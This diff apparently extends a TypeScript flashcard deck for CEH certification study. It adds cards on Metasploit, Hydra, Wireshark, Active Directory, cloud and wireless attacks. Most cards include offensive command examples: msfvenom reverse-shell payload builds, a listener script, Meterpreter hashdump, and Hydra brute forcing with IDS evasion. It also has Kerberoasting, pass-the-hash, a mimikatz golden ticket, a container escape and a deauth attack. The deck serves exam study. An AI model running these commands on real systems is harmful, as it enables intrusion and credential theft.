@@ -535,5 +535,213 @@ export const CEH_FLASHCARDS: FlashcardTerm[] = [
     definition: 'Querying an ML model repeatedly with crafted inputs to mathematically reconstruct sensitive private training data (such as medical records, SSNs, or proprietary source code) from output confidence scores.',
     examTip: 'Countermeasure: Differential Privacy (DP-SGD) and rounding/limiting precision of confidence scores in API responses.',
     commandOrExample: 'Extracting patient health data from a diagnostic neural network via repeated probability probing.'
+  },
+
+  // Extended Deck: Penetration Testing & Scanning Tools (Metasploit, Wireshark, Hydra)
+  {
+    id: 'fc-msf-payloads',
+    term: 'Metasploit: Staged vs. Stageless Payloads',
+    domainCode: 'MOD-06',
+    domainName: 'System Hacking',
+    category: 'Metasploit Suite',
+    definition: 'Staged payloads (`meterpreter/reverse_tcp`) transmit a small initial stager that downloads the larger payload over the network. Stageless payloads (`meterpreter_reverse_tcp`) embed the entire standalone shell into a single executable binary, functioning reliably without secondary network fetching.',
+    examTip: 'Look for slashes vs. underscores: Slashes = Staged (`/`), Underscore = Stageless (`_`).',
+    commandOrExample: 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe'
+  },
+  {
+    id: 'fc-msf-encoders',
+    term: 'Metasploit: msfvenom Encoders & Bad Characters',
+    domainCode: 'MOD-06',
+    domainName: 'System Hacking',
+    category: 'Metasploit Suite',
+    definition: 'Encoders (e.g. `x86/shikata_ga_nai`) mutate and obfuscate shellcode bytes to eliminate bad characters (like null bytes `\\x00` that terminate C-strings in memory) and evade basic static signature detectors.',
+    examTip: 'Use `-b "\\x00\\x0a\\x0d"` to strip null and newline bytes that break buffer overflow inputs.',
+    commandOrExample: 'msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -b "\\x00\\x0a" -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe'
+  },
+  {
+    id: 'fc-msf-meterpreter',
+    term: 'Meterpreter: In-Memory Post-Exploitation',
+    domainCode: 'MOD-06',
+    domainName: 'System Hacking',
+    category: 'Metasploit Suite',
+    definition: 'An advanced, dynamically extensible payload that executes entirely in target memory via reflective DLL injection without touching disk, providing commands for credential harvesting, process migration, and network pivoting.',
+    examTip: 'Key commands: `sysinfo`, `getuid`, `getsystem` (privilege escalation), `hashdump` (SAM hashes), `migrate <PID>` (stealth).',
+    commandOrExample: 'meterpreter > ps\nmeterpreter > migrate 1844\nmeterpreter > getsystem\nmeterpreter > hashdump'
+  },
+  {
+    id: 'fc-msf-resource-script',
+    term: 'Metasploit: Resource Scripts (.rc)',
+    domainCode: 'MOD-06',
+    domainName: 'System Hacking',
+    category: 'Metasploit Suite',
+    definition: 'Batch configuration files containing sequential msfconsole commands executed automatically at launch to rapidly configure listeners, database workspaces, and automated post-exploitation tasks.',
+    examTip: 'Run via `msfconsole -r script.rc` or `resource script.rc` within an active console session.',
+    commandOrExample: 'echo -e "use exploit/multi/handler\\nset payload windows/meterpreter/reverse_tcp\\nset LHOST 0.0.0.0\\nset LPORT 4444\\nexploit -j" > listener.rc'
+  },
+  {
+    id: 'fc-wireshark-bpf-vs-display',
+    term: 'Wireshark: BPF Capture Filters vs. Display Filters',
+    domainCode: 'MOD-08',
+    domainName: 'Sniffing',
+    category: 'Wireshark Suite',
+    definition: 'Berkeley Packet Filter (BPF) capture filters evaluate at the kernel/libpcap driver level BEFORE packets hit memory. Display filters evaluate post-capture across fully dissected protocol fields inside the GUI.',
+    examTip: 'Capture filter syntax: `host 192.168.1.1 and port 80`. Display filter syntax: `ip.addr == 192.168.1.1 && tcp.port == 80`.',
+    commandOrExample: 'Capture: "tcp port 443" | Display: "tls.handshake.type == 1"'
+  },
+  {
+    id: 'fc-wireshark-follow-stream',
+    term: 'Wireshark: Follow TCP/HTTP Stream',
+    domainCode: 'MOD-08',
+    domainName: 'Sniffing',
+    category: 'Wireshark Suite',
+    definition: 'A Wireshark feature that reassembles all fragmented packets across a bidirectional TCP conversation, displaying the complete application-layer transaction in human-readable chronological text.',
+    examTip: 'Crucial for inspecting cleartext credentials in Telnet, FTP, or unencrypted HTTP POST transmissions.',
+    commandOrExample: 'Right-click packet -> Follow -> TCP Stream (sets filter tcp.stream eq 4)'
+  },
+  {
+    id: 'fc-wireshark-syn-analysis',
+    term: 'Wireshark: TCP Flags & Handshake Filtering',
+    domainCode: 'MOD-08',
+    domainName: 'Sniffing',
+    category: 'Wireshark Suite',
+    definition: 'Evaluating TCP control flags (SYN, ACK, FIN, RST, PSH, URG) to identify port scans, connection teardowns, and volumetric denial-of-service floods.',
+    examTip: 'SYN Packet: `tcp.flags.syn==1 and tcp.flags.ack==0`. SYN-ACK: `tcp.flags.syn==1 and tcp.flags.ack==1`. Reset: `tcp.flags.reset==1`.',
+    commandOrExample: 'wireshark display filter: tcp.flags.syn == 1 && tcp.flags.ack == 0'
+  },
+  {
+    id: 'fc-tshark-cli',
+    term: 'Tshark: Command-Line Packet Analyzer',
+    domainCode: 'MOD-08',
+    domainName: 'Sniffing',
+    category: 'Wireshark Suite',
+    definition: 'The headless, terminal-based companion to Wireshark, capable of live packet capture, parsing pcap files, and formatting specific extracted fields for security scripts.',
+    examTip: '`-i` selects interface, `-Y` applies display filter, `-T fields -e` extracts specific attributes.',
+    commandOrExample: 'tshark -i eth0 -Y "http.request.method==\\"POST\\"" -T fields -e ip.src -e http.host -e urlencoded-form.value'
+  },
+  {
+    id: 'fc-hydra-syntax',
+    term: 'THC-Hydra: Online Network Login Cracker',
+    domainCode: 'MOD-06',
+    domainName: 'System Hacking',
+    category: 'Hydra Suite',
+    definition: 'A fast, multi-threaded network logon cracker supporting over 50 protocols including SSH, FTP, RDP, SMB, HTTP-POST-Form, MySQL, Telnet, and VNC.',
+    examTip: 'Syntax rules: Lowercase `-l`/`-p` is for a single user/pass; uppercase `-L`/`-P` is for user/password list files.',
+    commandOrExample: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.50 ssh -t 16 -V'
+  },
+  {
+    id: 'fc-hydra-http-post',
+    term: 'THC-Hydra: HTTP-POST-Form Brute Forcing',
+    domainCode: 'MOD-06',
+    domainName: 'System Hacking',
+    category: 'Hydra Suite',
+    definition: 'Hydra\'s module for cracking web login forms, requiring target URL path, parameter format with `^USER^` and `^PASS^` placeholders, and an HTTP failure condition (`F=`) or success condition (`S=`).',
+    examTip: 'Failure condition `F=invalid` instructs Hydra that any response containing "invalid" was an incorrect password.',
+    commandOrExample: 'hydra 10.0.0.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=invalid password" -L users.txt -P pass.txt'
+  },
+  {
+    id: 'fc-hydra-rate-limiting',
+    term: 'THC-Hydra: Rate Limiting & Stealth Evasion',
+    domainCode: 'MOD-06',
+    domainName: 'System Hacking',
+    category: 'Hydra Suite',
+    definition: 'Options in Hydra to avoid triggering IDS/IPS thresholds and fail2ban bans during online credential verification.',
+    examTip: '`-W <sec>` sets wait delay between connections; `-t <threads>` reduces concurrent parallel tasks; `-f` stops scanning upon first valid credential found.',
+    commandOrExample: 'hydra -l root -P pass.txt 192.168.1.100 ssh -t 2 -W 5 -f'
+  },
+
+  // Extended Deck: Active Directory & Identity
+  {
+    id: 'fc-kerberoasting',
+    term: 'Kerberoasting Attack',
+    domainCode: 'MOD-04',
+    domainName: 'Enumeration',
+    category: 'Active Directory',
+    definition: 'Extracting Kerberos Ticket Granting Service (TGS) tickets for service accounts with registered Service Principal Names (SPNs) and cracking the RC4 or AES ticket offline to discover plaintext service passwords.',
+    examTip: 'Requires only regular unprivileged domain credentials. Does NOT generate account lockouts because cracking is done offline.',
+    commandOrExample: 'GetUserSPNs.py corp.local/john:Password123 -dc-ip 10.0.0.1 -request'
+  },
+  {
+    id: 'fc-asrep-roasting',
+    term: 'AS-REP Roasting',
+    domainCode: 'MOD-04',
+    domainName: 'Enumeration',
+    category: 'Active Directory',
+    definition: 'Targeting user accounts that have Kerberos Pre-Authentication disabled (`DONT_REQ_PREAUTH`). Any attacker can request an AS-REP ticket for that user and crack the encrypted hash offline.',
+    examTip: 'Does NOT require any domain credentials to request the AS-REP ticket, unlike Kerberoasting.',
+    commandOrExample: 'GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -dc-ip 10.0.0.1'
+  },
+  {
+    id: 'fc-pass-the-hash',
+    term: 'Pass-the-Hash (PtH)',
+    domainCode: 'MOD-06',
+    domainName: 'System Hacking',
+    category: 'Active Directory',
+    definition: 'Authenticating to remote Windows systems across SMB, RPC, or WMI by supplying an NTLM password hash directly to the authentication protocol without cracking or knowing the plaintext password.',
+    examTip: 'Mitigated by Restricted Admin mode for RDP, LAPS (Local Administrator Password Solution), and disabling NTLM.',
+    commandOrExample: 'wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.0.0.5'
+  },
+  {
+    id: 'fc-golden-ticket',
+    term: 'Golden Ticket (KRBTGT Compromise)',
+    domainCode: 'MOD-06',
+    domainName: 'System Hacking',
+    category: 'Active Directory',
+    definition: 'A forged Kerberos Ticket Granting Ticket (TGT) created using the compromised NTLM hash of the `krbtgt` domain account, granting complete, persistent domain dominance with arbitrary group memberships.',
+    examTip: 'A Golden Ticket can be valid for up to 10 years and survives standard administrative password changes.',
+    commandOrExample: 'mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /id:500 /ptt'
+  },
+
+  // Extended Deck: Cloud & Modern Infrastructure
+  {
+    id: 'fc-aws-imds',
+    term: 'AWS IMDSv1 vs. IMDSv2',
+    domainCode: 'MOD-19',
+    domainName: 'Cloud Computing',
+    category: 'Cloud Security',
+    definition: 'The Instance Metadata Service on IP `169.254.169.254`. IMDSv1 allows simple HTTP GET requests vulnerable to SSRF. IMDSv2 enforces session-oriented requests requiring an HTTP PUT request with a `X-aws-ec2-metadata-token-ttl-seconds` header.',
+    examTip: 'Enforcing IMDSv2 completely neutralizes classic SSRF credential exfiltration.',
+    commandOrExample: 'TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`'
+  },
+  {
+    id: 'fc-container-escape',
+    term: 'Docker Privileged Container Escape',
+    domainCode: 'MOD-19',
+    domainName: 'Cloud Computing',
+    category: 'Container Security',
+    definition: 'When a Docker container is started with the `--privileged` flag, Linux security boundaries (AppArmor, seccomp, capability limits) are stripped, allowing root inside the container to access host devices and mount the host filesystem.',
+    examTip: 'Mounting the host root disk `/dev/sda1` inside the container grants full read/write access to host `/etc/shadow`.',
+    commandOrExample: 'fdisk -l && mkdir -p /mnt/host && mount /dev/sda1 /mnt/host'
+  },
+
+  // Extended Deck: Wireless & IoT
+  {
+    id: 'fc-wpa3-dragonfly',
+    term: 'WPA3 SAE (Dragonfly Handshake)',
+    domainCode: 'MOD-16',
+    domainName: 'Hacking Wireless Networks',
+    category: 'Wireless Security',
+    definition: 'Simultaneous Authentication of Equals (SAE) replaces the vulnerable WPA2 4-way Pre-Shared Key handshake with zero-knowledge password proofs, providing forward secrecy and rendering captured handshakes uncrackable offline.',
+    examTip: 'Protects users even if they select simple or weak Wi-Fi passwords, defeating dictionary attacks.',
+    commandOrExample: 'WPA3 handshake captures cannot be cracked using hashcat/aircrack-ng wordlists.'
+  },
+  {
+    id: 'fc-80211-deauth',
+    term: '802.11 Deauthentication Attack',
+    domainCode: 'MOD-16',
+    domainName: 'Hacking Wireless Networks',
+    category: 'Wireless Security',
+    definition: 'Transmitting spoofed 802.11 Management frames (Type 0, Subtype 12) from an attacker to force a wireless client to disconnect from an Access Point, compelling reconnection to capture a 4-way handshake or force association with an Evil Twin.',
+    examTip: 'WPA3 mandates Protected Management Frames (802.11w / PMF) which cryptographically encrypts and prevents deauth attacks.',
+    commandOrExample: 'aireplay-ng -0 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon'
+  },
+  {
+    id: 'fc-modbus-502',
+    term: 'Modbus TCP Port 502 Vulnerabilities',
+    domainCode: 'MOD-18',
+    domainName: 'IoT and OT Hacking',
+    category: 'OT & SCADA Security',
+    definition: 'An industrial protocol used in SCADA and PLC control systems. Communicating over unencrypted TCP port 502, it features zero native authentication, allowing any network peer to issue commands altering physical sensor registers and relays.',
+    examTip: 'Function Code 05: Write Single Coil; Function Code 06: Write Single Register.',
+    commandOrExample: 'nmap -p 502 --script s7-info,modicon-info 192.168.1.200'
   }
 ];
